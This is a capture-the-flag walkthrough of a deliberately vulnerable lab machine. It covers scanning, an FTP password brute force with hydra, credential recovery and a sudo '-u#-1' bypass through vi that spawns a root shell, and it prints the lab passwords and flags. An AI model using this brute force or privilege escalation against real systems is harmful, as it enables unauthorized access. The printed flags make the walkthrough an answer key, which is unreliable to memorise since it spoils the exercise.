# Year of the Rabbit

Laurent Chauvin | November 03, 2022

## Resources

[1] https://www.linuxtechi.com/run-unix-commands-in-vi-editor/#:~:text=First%20Go%20to%20command%20mode,command%2C%20example%20is%20shown%20below.&text=Example%20%3A%20Run%20the%20ifconfig%20command,the%20%2Fetc%2Fhosts%20file

[2] https://gtfobins.github.io/

## Progress

```
export IP=10.10.0.101
```

Nmap scan
```
nmap -sC -sV -oN nmap/initial $IP

Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-03 00:12 EDT
Nmap scan report for 10.10.0.101
Host is up (0.12s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 a0:8b:6b:78:09:39:03:32:ea:52:4c:20:3e:82:ad:60 (DSA)
|   2048 df:25:d0:47:1f:37:d9:18:81:87:38:76:30:92:65:1f (RSA)
|   256 be:9f:4f:01:4a:44:c8:ad:f5:03:cb:00:ac:8f:49:44 (ECDSA)
|_  256 db:b1:c1:b9:cd:8c:9d:60:4f:f1:98:e2:99:fe:08:03 (ED25519)
80/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.10 (Debian)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.29 seconds
```

Gobuster scan
```
gobuster dir -u $IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | tee gobuster.log

===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.0.101
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Timeout:                 10s
===============================================================
2022/11/03 00:13:01 Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 311] [--> http://10.10.0.101/assets/]
/server-status        (Status: 403) [Size: 276]
Progress: 220548 / 220561 (99.99%)===============================================================
2022/11/03 00:55:27 Finished
===============================================================
```

Nikto scan
```
nikto -h "http://$IP" | tee nikto.log

- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.0.101
+ Target Hostname:    10.10.0.101
+ Target Port:        80
+ Start Time:         2022-11-03 00:13:09 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.10 (Debian)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server may leak inodes via ETags, header found with file /, inode: 1ead, size: 59cc3cda1f3a4, mtime: gzip
+ Apache/2.4.10 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7891 requests: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2022-11-03 00:29:36 (GMT-4) (987 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

Website show Apache default page. No 'robots.txt'. Nothing in source code, just this comment
```
<!--      <div class="table_of_contents floating_element">
        <div class="section_header section_header_grey">
          TABLE OF CONTENTS
        </div>
        <div class="table_of_contents_item floating_element">
          <a href="#about">About</a>
        </div>
        <div class="table_of_contents_item floating_element">
          <a href="#changes">Changes</a>
        </div>
        <div class="table_of_contents_item floating_element">
          <a href="#scope">Scope</a>
        </div>
        <div class="table_of_contents_item floating_element">
          <a href="#files">Config files</a>
        </div>
      </div>
-->
```

Anonymous ftp doesn't work.

In '/assets'
```
[VID]	RickRolled.mp4	2020-01-23 00:34 	384M	 
[TXT]	style.css	2020-01-23 00:34 	2.9K	 
```

Let's get them.

```
wget http://10.10.0.101/assets/RickRolled.mp4
wget http://10.10.0.101/assets/style.css
```

Examining the 'style.css' we can see
```
/* 
Nice to see someone checking the stylesheets.
Take a look at the page: /sup3r_s3cr3t_fl4g.php
*/
```

Going to '/sup3r_s3cr3t_fl4g.php' redirect to a rick roll video on YouTube. However, before that we have a message:

```
Word of advice... Turn off your javascript...
```

Maybe disabling Javascript will prevent the redirection. Let's try with curl (no -L option to follow redirection).
```
curl http://$IP/sup3r_s3cr3t_fl4g.php
```
Doesn't return anything.
However, turning on verbosity we get
```
curl -vvv http://$IP/sup3r_s3cr3t_fl4g.php

*   Trying 10.10.0.101:80...
* Connected to 10.10.0.101 (10.10.0.101) port 80 (#0)
> GET /sup3r_s3cr3t_fl4g.php HTTP/1.1
> Host: 10.10.0.101
> User-Agent: curl/7.84.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 302 Found
< Date: Thu, 03 Nov 2022 04:40:43 GMT
< Server: Apache/2.4.10 (Debian)
< Location: intermediary.php?hidden_directory=/WExYY2Cv-qU
< Content-Length: 0
< Content-Type: text/html; charset=UTF-8
< 
* Connection #0 to host 10.10.0.101 left intact
```

We can find this line
```
< Location: intermediary.php?hidden_directory=/WExYY2Cv-qU
```

When going to 'http://$IP//WExYY2Cv-qU' we find a
```
	Hot_Babe.png	2020-01-23 00:34 	464K	 
```

Which is a photo of Lena, used as example in compression.

Let's get it

```
wget http://$IP//WExYY2Cv-qU/Hot_Babe.png
```

A ```binwalk``` on 'Hot_Babe.png'
```
binwalk Hot_Babe.png 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 512 x 512, 8-bit/color RGB, non-interlaced
54            0x36            Zlib compressed data, best compression
```
Which I believe is normal for .png.

Ok, let's turn off Javascript on Firefox. Go to URL 'about:config', search for 'javascript', find 'javascript.enabled' and toggle it to off.

Reload the page.

We now have
```
Love it when people block Javascript...
This is happening whether you like it or not... The hint is in the video. If you're stuck here then you're just going to have to bite the bullet!
Make sure your audio is turned up!
```

And below is the video in 'assets/RickRolled.mp4' we downloaded earlier.

This video is very large for a video. Let's check it.

```
binwalk RickRolled.mp4 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
8610811       0x8363FB        Cisco IOS experimental microcode, for ""
66694464      0x3F9AD40       Uncompressed Adobe Flash SWF file, Version 114, File size (header included) 116146852
77987059      0x4A5FCF3       MySQL MISAM index file Version 6
89148578      0x5504CA2       LZ4 compressed data, legacy
89390783      0x553FEBF       MySQL ISAM index file Version 9
112211718     0x6B03706       StuffIt Deluxe Segment (data): fK
183068423     0xAE96707       MySQL ISAM compressed data file Version 6
200345565     0xBF107DD       MySQL MISAM index file Version 1
228904536     0xDA4CE58       gzip compressed data, has header CRC, last modified: 2098-03-25 13:36:58 (bogus date)
267780318     0xFF600DE       StuffIt Deluxe Segment (data): f5
318828326     0x1300EF26      MySQL ISAM compressed data file Version 1
```

Wow !!! What is that ?? Is it binwalk going crazy, or is there really something in there?

Let's extract it and verify. Seems like non-sense. Let's put it aside for now.

Let's get back to Lena, the only thing non 'Rick Roll' related for now.

Running strings on it gives us
```
Eh, you've earned this. Username for FTP is ftpuser
One of these is the password:
Mou+56n%QK8sr
1618B0AUshw1M
A56IpIl%1s02u
vTFbDzX9&Nmu?
FfF~sfu^UQZmT
8FF?iKO27b~V0
ua4W~2-@y7dE$
3j39aMQQ7xFXT
Wb4--CTc4ww*-
u6oY9?nHv84D&
0iBp4W69Gr_Yf
TS*%miyPsGV54
C77O3FIy0c0sd
O14xEhgg0Hxz1
5dpv#Pr$wqH7F
1G8Ucoce1+gS5
0plnI%f0~Jw71
0kLoLzfhqq8u&
kS9pn5yiFGj6d
zeff4#!b5Ib_n
rNT4E4SHDGBkl
KKH5zy23+S0@B
3r6PHtM4NzJjE
gm0!!EC1A0I2?
HPHr!j00RaDEi
7N+J9BYSp4uaY
PYKt-ebvtmWoC
3TN%cD_E6zm*s
eo?@c!ly3&=0Z
nR8&FXz$ZPelN
eE4Mu53UkKHx#
86?004F9!o49d
SNGY0JjA5@0EE
trm64++JZ7R6E
3zJuGL~8KmiK^
CR-ItthsH%9du
yP9kft386bB8G
A-*eE3L@!4W5o
GoM^$82l&GA5D
1t$4$g$I+V_BH
0XxpTd90Vt8OL
j0CN?Z#8Bp69_
G#h~9@5E5QA5l
DRWNM7auXF7@j
Fw!if_=kk7Oqz
92d5r$uyw!vaE
c-AA7a2u!W2*?
zy8z3kBi#2e36
J5%2Hn+7I6QLt
gL$2fmgnq8vI*
Etb?i?Kj4R=QM
7CabD7kwY7=ri
4uaIRX~-cY6K4
kY1oxscv4EB2d
k32?3^x1ex7#o
ep4IPQ_=ku@V8
tQxFJ909rd1y2
5L6kpPR5E2Msn
65NX66Wv~oFP2
LRAQ@zcBphn!1
V4bt3*58Z32Xe
ki^t!+uqB?DyI
5iez1wGXKfPKQ
nJ90XzX&AnF5v
7EiMd5!r%=18c
wYyx6Eq-T^9#@
yT2o$2exo~UdW
ZuI-8!JyI6iRS
PTKM6RsLWZ1&^
3O$oC~%XUlRO@
KW3fjzWpUGHSW
nTzl5f=9eS&*W
WS9x0ZF=x1%8z
Sr4*E4NT5fOhS
hLR3xQV*gHYuC
4P3QgF5kflszS
NIZ2D%d58*v@R
0rJ7p%6Axm05K
94rU30Zx45z5c
Vi^Qf+u%0*q_S
1Fvdp&bNl3#&l
zLH%Ot0Bw&c%9
```

Let's bruteforce it.
```
hydra -l ftpuser -P ftp_passwd_list.txt ftp://$IP
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-11-03 00:58:33
[DATA] max 16 tasks per 1 server, overall 16 tasks, 82 login tries (l:1/p:82), ~6 tries per task
[DATA] attacking ftp://10.10.0.101:21/
[21][ftp] host: 10.10.0.101   login: ftpuser   password: 5iez1wGXKfPKQ
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-11-03 00:58:48
```

Let's connect, and get the data
```
ftp $IP

Connected to 10.10.0.101.
220 (vsFTPd 3.0.2)
Name (10.10.0.101:kali): ftpuser
331 Please specify the password.
Password: 5iez1wGXKfPKQ
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||38756|).
150 Here comes the directory listing.
-rw-r--r--    1 0        0             758 Jan 23  2020 Eli's_Creds.txt
226 Directory send OK.
ftp> get Eli's_Creds.txt
local: Eli's_Creds.txt remote: Eli's_Creds.txt
229 Entering Extended Passive Mode (|||57074|).
150 Opening BINARY mode data connection for Eli's_Creds.txt (758 bytes).
100% |***********************************************************************************************************************************************************************************************|   758      165.34 KiB/s    00:00 ETA
226 Transfer complete.
758 bytes received in 00:00 (6.19 KiB/s)
ftp> exit
221 Goodbye.
```

Let's check the file
```
cat ftp/Eli\'s_Creds.txt 

+++++ ++++[ ->+++ +++++ +<]>+ +++.< +++++ [->++ +++<] >++++ +.<++ +[->-
--<]> ----- .<+++ [->++ +<]>+ +++.< +++++ ++[-> ----- --<]> ----- --.<+
++++[ ->--- --<]> -.<++ +++++ +[->+ +++++ ++<]> +++++ .++++ +++.- --.<+
+++++ +++[- >---- ----- <]>-- ----- ----. ---.< +++++ +++[- >++++ ++++<
]>+++ +++.< ++++[ ->+++ +<]>+ .<+++ +[->+ +++<] >++.. ++++. ----- ---.+
++.<+ ++[-> ---<] >---- -.<++ ++++[ ->--- ---<] >---- --.<+ ++++[ ->---
--<]> -.<++ ++++[ ->+++ +++<] >.<++ +[->+ ++<]> +++++ +.<++ +++[- >++++
+<]>+ +++.< +++++ +[->- ----- <]>-- ----- -.<++ ++++[ ->+++ +++<] >+.<+
++++[ ->--- --<]> ---.< +++++ [->-- ---<] >---. <++++ ++++[ ->+++ +++++
<]>++ ++++. <++++ +++[- >---- ---<] >---- -.+++ +.<++ +++++ [->++ +++++
<]>+. <+++[ ->--- <]>-- ---.- ----. <
```

This is a 'Brainfuck' cipher. Let's go to https://www.dcode.fr/langage-brainfuck . Decode as
```
User: eli
Password: DSpDiM1wAEwid
```

Let's go SSH.
```
ssh eli@$IP   

The authenticity of host '10.10.0.101 (10.10.0.101)' can't be established.
ED25519 key fingerprint is SHA256:va5tHoOroEmHPZGWQySirwjIb9lGquhnIA1Q0AY/Wrw.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.0.101' (ED25519) to the list of known hosts.
eli@10.10.0.101's password: DSpDiM1wAEwid


1 new message
Message from Root to Gwendoline:

"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"

END MESSAGE


eli@year-of-the-rabbit:~$ 
```

Let's check home directory
```
eli@year-of-the-rabbit:~$ ls -al
total 656
drwxr-xr-x 16 eli  eli    4096 Jan 23  2020 .
drwxr-xr-x  4 root root   4096 Jan 23  2020 ..
lrwxrwxrwx  1 eli  eli       9 Jan 23  2020 .bash_history -> /dev/null
-rw-r--r--  1 eli  eli     220 Jan 23  2020 .bash_logout
-rw-r--r--  1 eli  eli    3515 Jan 23  2020 .bashrc
drwxr-xr-x  8 eli  eli    4096 Jan 23  2020 .cache
drwx------ 11 eli  eli    4096 Jan 23  2020 .config
-rw-------  1 eli  eli  589824 Jan 23  2020 core
drwxr-xr-x  2 eli  eli    4096 Jan 23  2020 Desktop
drwxr-xr-x  2 eli  eli    4096 Jan 23  2020 Documents
drwxr-xr-x  2 eli  eli    4096 Jan 23  2020 Downloads
drwx------  3 eli  eli    4096 Jan 23  2020 .gconf
drwx------  2 eli  eli    4096 Jan 23  2020 .gnupg
-rw-------  1 eli  eli    1098 Jan 23  2020 .ICEauthority
drwx------  3 eli  eli    4096 Jan 23  2020 .local
drwxr-xr-x  2 eli  eli    4096 Jan 23  2020 Music
drwxr-xr-x  2 eli  eli    4096 Jan 23  2020 Pictures
-rw-r--r--  1 eli  eli     675 Jan 23  2020 .profile
drwxr-xr-x  2 eli  eli    4096 Jan 23  2020 Public
drwx------  2 eli  eli    4096 Jan 23  2020 .ssh
drwxr-xr-x  2 eli  eli    4096 Jan 23  2020 Templates
drwxr-xr-x  2 eli  eli    4096 Jan 23  2020 Videos
```

Not sure what 'core' is.

```
file core              

core: ELF 64-bit LSB core file, x86-64, version 1 (SYSV), SVR4-style, from '/usr/bin/vmtoolsd -n vmusr --blockFd 3', real uid: 1000, effective uid: 1000, real gid: 1000, effective gid: 1000
```

Seems like an executable. However, can't run it.
```
eli@year-of-the-rabbit:~$ chmod +x core
eli@year-of-the-rabbit:~$ ./core 
-bash: ./core: cannot execute binary file: Exec format error
```

So let's try to find that s3cr3t 'hidding place'. The message is adressed to Gwendoline but we logged in as eli.

Let's check home directories.

```
eli@year-of-the-rabbit:/home$ ls

eli  gwendoline
```

Indeed Gwendoline has a home directory. Let's check this out.

```
eli@year-of-the-rabbit:/home/gwendoline$ ls -al
total 24
drwxr-xr-x 2 gwendoline gwendoline 4096 Jan 23  2020 .
drwxr-xr-x 4 root       root       4096 Jan 23  2020 ..
lrwxrwxrwx 1 root       root          9 Jan 23  2020 .bash_history -> /dev/null
-rw-r--r-- 1 gwendoline gwendoline  220 Jan 23  2020 .bash_logout
-rw-r--r-- 1 gwendoline gwendoline 3515 Jan 23  2020 .bashrc
-rw-r--r-- 1 gwendoline gwendoline  675 Jan 23  2020 .profile
-r--r----- 1 gwendoline gwendoline   46 Jan 23  2020 user.txt
```

User flag is there, but we don't have permission. The 's3cr3t' hidding place made me think to the sup3r_s3cr3t_fl4g, so I went to '/var/www/html/' but found nothing that we already found.

Looking for 's3cr3t' on the system:
```
eli@year-of-the-rabbit:/var/www/html/assets$ find / -name "s3cr3t" 2>/dev/null

/usr/games/s3cr3t
```

Interesting, let's check this out.
```
eli@year-of-the-rabbit:/usr/games/s3cr3t$ ls -al
total 12
drwxr-xr-x 2 root root 4096 Jan 23  2020 .
drwxr-xr-x 3 root root 4096 Jan 23  2020 ..
-rw-r--r-- 1 root root  138 Jan 23  2020 .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
```

Let's show this message
```
eli@year-of-the-rabbit:/usr/games/s3cr3t$ cat .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly\! 
Your password is awful, Gwendoline. 
It should be at least 60 characters long! Not just MniVCQVhQHUNI
Honestly!

Yours sincerely
   -Root
```

We now have Gwendoline's access. Let's connect as her and get the flag in her home directory.
```
ssh gwendoline@10.10.46.0  

gwendoline@10.10.46.0's password: MniVCQVhQHUNI


1 new message
Message from Root to Gwendoline:

"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"

END MESSAGE
```

Let's get flag
```
gwendoline@year-of-the-rabbit:~$ cat user.txt 

THM{1107174691af9ff3681d2b5bdb5740b1589bae53}
```

Time to privesc.

```
sudo -l
Matching Defaults entries for gwendoline on year-of-the-rabbit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User gwendoline may run the following commands on year-of-the-rabbit:
    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
```

We can see that Gwendoline can run ```vi``` which belong to root
```
gwendoline@year-of-the-rabbit:~$ ls -al /usr/bin/vi

lrwxrwxrwx 1 root root 20 Jan 23  2020 /usr/bin/vi -> /etc/alternatives/vi
```

As ```vi``` can execute commands, maybe we could run some commands while in vi.

From [1] we can see we can run commands in ```vi``` with '!'. Let's try to call bash.

Tried different thing, but didn't manage to privesc, but I remember in a previous room, there was an exploit for ```sudo (ALL, !root)```.

After checking it, I ran the following
```
gwendoline@year-of-the-rabbit:~$ sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt 
```

Which spawn a ```vi```, now running the ```:!/bin/bash``` returned a root shell.

```
root@year-of-the-rabbit:/home/gwendoline# whoami

root
```

Let's get flag
```
root@year-of-the-rabbit:/home/gwendoline# cat /root/root.txt 

THM{8d6f163a87a1c80de27a4fd61aef0f3a0ecf9161}
```

## Flag

1. User

```
THM{1107174691af9ff3681d2b5bdb5740b1589bae53}
```

2. Privesc

```
THM{8d6f163a87a1c80de27a4fd61aef0f3a0ecf9161}
```

## To Go Further

I removed the 'RickRoll.mp4' from the git as it was big, and useless in the end.
